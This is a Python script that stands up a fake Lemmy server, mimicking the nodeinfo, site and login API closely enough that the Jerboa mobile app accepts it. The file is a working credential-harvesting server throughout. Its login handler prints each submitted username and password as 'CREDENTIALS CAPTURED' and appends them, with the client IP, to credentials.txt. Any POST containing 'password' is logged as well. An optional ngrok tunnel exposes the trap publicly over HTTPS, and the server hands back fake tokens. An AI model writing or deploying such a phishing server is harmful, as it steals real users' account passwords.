#!/usr/bin/env python3
import argparse
import json
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

# Try to import pyngrok for integrated tunneling
try:
    from pyngrok import ngrok
except ImportError:
    print("Pyngrok not found. Install it with: pip install pyngrok")


class LemmyHandler(BaseHTTPRequestHandler):
    # Class variable to store tunnel status
    use_tunnel = False

    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        # Handle pre-flight requests from the app
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = (
            self.rfile.read(content_length).decode("utf-8")
            if content_length > 0
            else ""
        )

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[{timestamp}] INCOMING POST: {self.path}")
        print(f"Headers: {self.headers}")
        print(f"Body: {body}")

        # Try to extract credentials regardless of the path
        if "password" in body.lower():
            with open("credentials.txt", "a") as f:
                f.write(f"[{timestamp}] POST to {self.path}\n{body}\n\n")

        # Generic response to keep the app happy
        if "/user/login" in self.path:
            self._handle_login(body)
        else:
            self._send_json({"status": "ok"})

    def do_GET(self):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        host = self.headers.get("Host", "localhost")
        print(f"[{timestamp}] GET Request: {self.path}")

        # 1. Discovery phase
        if "/.well-known/nodeinfo" in self.path:
            # Detect if we should use http or https based on the request
            protocol = "https" if "https" in self.path or self.use_tunnel else "http"
            self._send_json(
                {
                    "links": [
                        {
                            "rel": "http://nodeinfo.diaspora.software/ns/schema/2.0",
                            "href": f"{protocol}://{host}/nodeinfo/2.0.json",
                        }
                    ]
                }
            )
        # 2. Data phase (The part the app was crashing on)
        elif "nodeinfo/2.0.json" in self.path:
            self._send_json(
                {
                    "version": "2.0",
                    "software": {"name": "lemmy", "version": "0.19.3"},
                    "protocols": ["activitypub"],
                    "services": {"inbound": [], "outbound": []},
                    "openRegistrations": True,
                    "usage": {
                        "users": {
                            "total": 1,
                            "activeHalfyear": 1,  # ADD THIS
                            "activeMonth": 1,  # ADD THIS
                        },
                        "localPosts": 1,
                        "localComments": 1,
                    },
                    "metadata": {},
                }
            )

        # 3. Site phase (Jerboa calls this right after login)
        elif "/api/v3/site" in self.path:
            host = self.headers.get("Host", "localhost")
            auth_header = self.headers.get("Authorization")

            now = datetime.now().isoformat() + "Z"

            my_user_data = None
            if auth_header:
                # Jerboa needs these specific nested objects to create the Account entity
                my_user_data = {
                    "local_user_view": {
                        "local_user": {
                            "id": 1,
                            "person_id": 1,
                            "email": "alice@example.com",
                            "email_verified": True,
                            "admin": True,
                            "show_nsfw": True,
                            "theme": "browser",
                            "default_listing_type": "All",
                            "default_sort_type": "Active",
                            "show_avatars": True,
                            "send_notifications_to_email": False,
                            "validator_time": "2024-01-01T00:00:00Z",
                            "show_scores": True,
                            "show_bot_accounts": True,
                            "show_read_posts": True,
                            "show_new_post_notifs": True,
                            "interface_language": "en",
                            "accepted_application": True,
                            "open_links_in_new_tab": False,
                            "blur_nsfw": True,
                            "auto_expand": True,
                            "infinite_scroll_enabled": True,
                            "post_listing_mode": "List",
                            "totp_2fa_enabled": False,
                            "enable_keyboard_navigation": True,
                            "enable_animated_images": True,
                            "collapse_bot_comments": False,
                        },
                        "person": {
                            "id": 1,
                            "name": "alice",
                            "display_name": "Alice",
                            "actor_id": f"https://{host}/u/alice",
                            "bio": "Capturing...",
                            "local": True,
                            "banned": False,
                            "published": "2024-01-01T00:00:00Z",
                            "updated": "2024-01-01T00:00:00Z",
                            "deleted": False,
                            "bot_account": False,
                            "instance_id": 1,
                        },
                        "counts": {
                            "id": 1,
                            "person_id": 1,
                            "post_count": 0,
                            "comment_count": 0,
                        },
                    },
                    "moderates": [],
                    "discussion_languages": [0],
                    "follows": [],
                    "community_blocks": [],
                    "instance_blocks": [],
                    "person_blocks": [],
                }

            self._send_json(
                {
                    "site_view": {
                        "site": {
                            "id": 1,
                            "name": "FakeLemmy",
                            "sidebar": "Capturing creds...",
                            "published": "2024-01-01T00:00:00Z",
                            "updated": "2024-01-01T00:00:00Z",
                            "last_refreshed_at": now,
                            "actor_id": f"http://{host}/",
                            "inbox_url": f"http://{host}/inbox",
                            "public_key": "fake-key",
                            "instance_id": 1,
                        },
                        "local_site": {
                            "id": 1,
                            "site_id": 1,
                            "site_setup": True,
                            "enable_downvotes": True,
                            "enable_nsfw": True,
                            "community_creation_admin_only": False,
                            "require_email_verification": False,
                            "federation_enabled": True,
                            "registration_mode": "Open",
                            "captcha_enabled": False,
                            # --- NEW FIELDS REQUIRED BY 0.19.3 ---
                            "private_instance": False,
                            "default_theme": "browser",
                            "default_post_listing_type": "All",
                            "hide_modlog_mod_names": False,
                            "application_email_admins": False,
                            "actor_name_max_length": 20,
                            "captcha_difficulty": "easy",
                            "published": "2024-01-01T00:00:00Z",
                            "reports_email_admins": False,
                            "federation_signed_fetch": False,
                        },
                        "counts": {
                            "id": 1,
                            "site_id": 1,
                            "users": 1,
                            "posts": 0,
                            "comments": 0,
                            "communities": 1,
                            "users_active_day": 1,
                            "users_active_week": 1,
                            "users_active_month": 1,
                            "users_active_half_year": 1,
                        },
                        "local_site_rate_limit": {
                            "id": 1,
                            "local_site_id": 1,
                            "published": "2024-01-01T00:00:00Z",
                            # Standard fields
                            "message": 6,
                            "post": 6,
                            "register": 6,
                            "image": 6,
                            "comment": 6,
                            "search": 6,
                            # Version specific fields
                            "message_per_second": 6,
                            "message_per_24h": 1000,
                            "post_per_second": 6,
                            "post_per_24h": 1000,
                            "register_per_second": 6,
                            "register_per_24h": 1000,
                            "image_per_second": 6,
                            "image_per_24h": 1000,
                            "comment_per_second": 6,
                            "comment_per_24h": 1000,
                            "search_per_second": 6,
                            "search_per_24h": 1000,
                            "import_user_settings": 6,
                            "import_user_settings_per_second": 6,
                        },
                    },
                    "admins": [],
                    "version": "0.19.3",
                    "my_user": my_user_data,
                    "all_languages": [{"id": 0, "code": "en", "name": "English"}],
                    "discussion_languages": [0],
                    "taglines": [],
                    "custom_emojis": [],
                }
            )
        else:
            self._send_json({"status": "ok"})

    def _handle_login(self, body):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            creds = json.loads(body)
            username = creds.get("username_or_email", "N/A")
            password = creds.get("password", "N/A")

            print(f"\n[{timestamp}] CREDENTIALS CAPTURED")
            print(f"  Username: {username} | Password: {password}\n")

            with open("credentials.txt", "a") as f:
                f.write(
                    f"[{timestamp}] {self.client_address[0]}\nUsername: {username}\nPassword: {password}\n\n"
                )

            self._send_json(
                {
                    "jwt": f"fake_token_{int(datetime.now().timestamp())}",
                    "registration_created": False,
                    "verify_email_sent": False,
                }
            )
        except Exception:
            self._send_json({"error": "invalid_request"}, 400)

    def _send_json(self, data, status=200):
        body = json.dumps(data).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        # This header helps skip some proxy warning pages
        self.send_header("ngrok-skip-browser-warning", "true")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--tunnel", action="store_true", help="Start an ngrok tunnel")
    args = parser.parse_args()

    # Handle Tunneling
    public_url = f"http://localhost:{args.port}"
    if args.tunnel:
        LemmyHandler.use_tunnel = True
        try:
            # Ensure you have set your authtoken: ngrok config add-authtoken <token>
            tunnel = ngrok.connect(args.port)
            public_url = tunnel.public_url
            print(f"[*] HTTPS Tunnel Active: {public_url}")
        except Exception as e:
            print(f"[!] Could not start tunnel: {e}")

    print(f"[*] Server listening on port {args.port}")

    server = HTTPServer(("0.0.0.0", args.port), LemmyHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server...")
        if args.tunnel:
            ngrok.disconnect(public_url)


if __name__ == "__main__":
    main()
